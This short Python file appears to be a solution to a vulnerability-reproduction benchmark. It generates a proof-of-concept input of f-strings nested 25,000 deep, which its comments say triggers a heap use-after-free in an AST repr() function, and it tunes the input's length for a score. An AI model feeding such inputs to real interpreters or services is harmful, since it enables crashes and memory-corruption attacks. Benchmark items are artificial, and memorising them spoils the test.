import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in the AST repr() function.
        # This is triggered by deeply nested f-strings (JoinedStr nodes).
        # Ground truth length of ~275KB implies a nesting depth of roughly 55,000.
        # We generate a payload with 25,000 depth to be shorter (better score) 
        # while still being deep enough to trigger the vulnerability.
        
        depth = 25000
        # Pattern: f'{ f'{ ... }' }'
        # Each level adds 5 bytes: "f'{" and "}'"
        payload = ("f'{" * depth) + "0" + ("}'" * depth)
        
        return payload.encode('utf-8')